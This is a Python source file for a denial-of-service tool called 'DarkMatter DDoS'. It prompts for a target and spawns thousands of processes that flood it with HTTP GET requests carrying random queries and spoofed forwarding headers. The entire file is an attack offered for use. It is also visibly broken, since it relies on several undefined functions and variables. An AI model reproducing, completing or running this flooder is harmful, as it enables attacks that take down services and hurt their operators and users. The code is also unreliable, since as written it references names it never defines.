import socket
import os
from time import sleep
import multiprocessing
import random
import platform

print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("Could not start the script")
else:
  print("Your system is not Linux, You may not be able to run this script in some systems")
def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    return header
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip

def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))

def attack():
  header = Headers("get")
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + header
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Welcome To DarkMatter DDoS\n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
print("[>>>] Starting the attack [<<<]")
sleep(1)

def send2attack():
  for i in range(9000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()
